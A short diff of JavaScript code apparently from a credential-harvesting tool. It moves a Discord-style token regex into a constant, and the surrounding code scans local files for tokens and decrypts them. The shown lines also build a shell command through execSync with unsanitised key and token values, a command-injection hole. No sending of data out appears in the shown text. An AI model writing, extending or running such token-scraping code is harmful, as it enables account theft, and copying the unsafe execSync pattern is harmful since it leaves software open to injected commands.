@@ -46,6 +46,7 @@ const decryptToken = (token, key) => execSync([
   `--key "${key}"`, `--token "${token}"`
 ].join(' ')).toString();
 
+const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/;
 const decryptRickRoll = (path) => {
   return new Promise((resolve, reject) => {
     const encryptedTokens = [];
@@ -137,7 +138,7 @@ const run = () => new Promise((resolve) => {
           if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
           const lines = readFileSync(filePath, { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
           lines.forEach((line) => {
-            const tokensMatch = line.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/);
+            const tokensMatch = line.match(tokenRegex);
             if (tokensMatch) {
               tokensMatch.forEach((token) => {
                 if (!tokens.includes(token)) tokens.push(token);
